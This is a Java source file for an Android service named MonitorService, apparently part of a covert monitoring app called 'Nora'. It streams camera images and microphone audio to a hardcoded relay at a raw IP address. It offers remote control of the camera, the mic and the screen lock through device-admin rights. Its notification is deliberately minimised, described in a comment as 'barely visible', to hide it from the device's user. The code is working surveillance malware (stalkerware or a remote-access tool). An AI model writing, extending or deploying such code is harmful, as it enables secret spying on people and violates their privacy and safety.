package com.nora.monitor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

public class MonitorService extends Service {

    private static final String TAG     = "MonitorService";
    static final String CHANNEL = "nora_monitor";
    private static final int    NOTIF_ID = 1;

    public static final String DEFAULT_RELAY = "http://162.35.37.67:5000";
    public static final String AGENT_SECRET  = "";

    private RelayClient          relay;
    private CameraCapture        cameraCapture;
    private MicCapture           micCapture;
    private ScreenOverlayManager screenOverlay;

    private static MonitorService instance;
    public static MonitorService getInstance() { return instance; }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // IMPORTANCE_MIN = no status-bar icon, no sound, barely visible
            NotificationChannel ch = new NotificationChannel(
                CHANNEL, "Nora", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notif = new NotificationCompat.Builder(this, CHANNEL)
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setShowWhen(false)
            .setSilent(true)
            .build();
        startForeground(NOTIF_ID, notif);

        if (relay == null) {
            String deviceName = Settings.Global.getString(getContentResolver(), "device_name");
            if (deviceName == null || deviceName.isEmpty()) deviceName = Build.MODEL;
            relay = new RelayClient(this, deviceName, AGENT_SECRET, DEFAULT_RELAY);
            relay.connect();

            cameraCapture = new CameraCapture(this, jpeg -> relay.emitCamera(jpeg));
            micCapture    = new MicCapture(pcm  -> relay.emitAudio(pcm));
        }

        return START_STICKY;
    }

    public void startCamera()  { if (cameraCapture != null) cameraCapture.start(); }
    public void stopCamera()   { if (cameraCapture != null) cameraCapture.stop();  }
    public void startMic()     { if (micCapture    != null) micCapture.start();    }
    public void stopMic()      { if (micCapture    != null) micCapture.stop();     }

    public void lockScreen(String requester) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, NoraDeviceAdmin.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.lockNow();
            } else {
                Log.w(TAG, "Device admin not active — cannot lock screen");
            }
            if (relay != null) {
                try {
                    JSONObject res = new JSONObject();
                    res.put("ok",         true);
                    res.put("_requester", requester);
                    relay.emitScreenOff(res);
                } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            Log.e(TAG, "lockScreen error", e);
        }
    }

    public RelayClient getRelay() { return relay; }
    public ScreenOverlayManager getScreenOverlay() {
        if (screenOverlay == null) screenOverlay = new ScreenOverlayManager(this);
        return screenOverlay;
    }

    @Override
    public void onDestroy() {
        instance = null;
        if (relay         != null) relay.disconnect();
        if (cameraCapture != null) cameraCapture.stop();
        if (micCapture    != null) micCapture.stop();
        super.onDestroy();
    }

    @Nullable @Override
    public IBinder onBind(Intent i) { return null; }
}
